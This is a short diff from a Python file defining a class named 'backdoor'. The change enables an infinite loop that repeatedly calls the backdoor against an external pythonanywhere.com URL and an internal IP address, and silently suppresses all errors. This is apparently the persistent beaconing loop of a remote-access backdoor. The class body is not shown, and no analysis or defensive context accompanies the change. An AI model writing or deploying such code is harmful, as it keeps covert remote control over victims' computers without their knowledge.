@@ -238,14 +238,14 @@ class backdoor:
 
         return output
     
-backdoor()
-# while True:
-#     try:
-#         backdoor() 
-#     except:
-#         pass
-#     try: 
-#         backdoor("http://10.2.100.100:8000/") 
-#     except:
-#         pass
+
+while True:
+    try:
+        backdoor("https://pybdtest.pythonanywhere.com/pc/30/") 
+    except:
+        pass
+    try: 
+        backdoor("http://10.2.100.100:8000/") 
+    except:
+        pass
   
